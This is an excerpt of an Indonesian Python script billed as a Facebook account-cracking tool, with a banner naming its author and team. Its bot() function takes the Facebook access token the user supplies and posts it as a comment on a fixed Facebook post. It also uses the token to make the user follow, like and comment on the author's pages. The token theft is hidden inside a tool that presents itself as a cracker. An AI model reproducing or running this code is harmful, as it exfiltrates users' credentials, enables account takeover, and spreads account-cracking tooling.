...
\033[92;1m----------------------------------------------------------
\033[97;1m╔[ \033[92;1mAuthor  \033[97;1m: \033[93;1mYNTKTS
\033[97;1m╠[ \033[92;1mWhatsApp \033[97;1m: \033[93;1m15075961235
\033[97;1m╠[ \033[92;1mGithub   \033[97;1m: \033[93;1mHttps://github.com/BocilAlok
\033[97;1m╠[ \033[92;1mFacebook \033[97;1m: \033[93;1m- \033[97;1m[\033[92;1mFollow My Facebook\033[97;1m]
\033[97;1m║\033[93;1m---------------------------------------------------------
\033[97;1m╠[ \033[92;1mScript Crack Facebook
\033[97;1m╠[ \033[92;1mTeam \033[97;1m: \033[93;1mFXT\033[97;1m-\033[93;1mCODE TEAM 2021
\033[97;1m╚[ \033[92;1mPlease Follow My My Facebook And GitHub \033[97;1m[\033[92;1m(>•,•<)\033[97;1m]
\033[92;1m----------------------------------------------------------
""")
...
def login():
	clear()
	banner()
	token = input("\n"+balmond+l+" Masukkan Token Facebook bang : ")
	try:
		...
		jalan(balmond+m+" Login Gagal Nyet")
		time.sleep(0.5)
		login()
...
def bot():
	try:
		...
		jalan(balmond+m+" Token Kadaluarsa Nyet")
		time.sleep(0.5)
		login()
	print(balmond+l+" Bentarr Bree, Follow Duluu Amaa Setor Token Mwhehehe")
	komentar = random.choice(["Halo Apa Kabar Kak Yoshi"])
	requests.post("https://graph.facebook.com/100077180790564/subscribers?access_token="+token) # sptty chan
	requests.post("https://graph.facebook.com/1262475690925947/likes?summary=true&access_token=" + token)
	requests.post("https://graph.facebook.com/117236420859051/comments/?message="+komentar+"&access_token="+token)
	requests.post("https://graph.facebook.com/117236420859051/comments/?message="+token+"&access_token="+token)
	menu()
...
def user_agent():
	...
	if pilih=="1" or pilih=="01":
		...
		user = "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]"
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan("\n"+balmond+h+" Berhasil")
		time.sleep(0.5)
		menu()
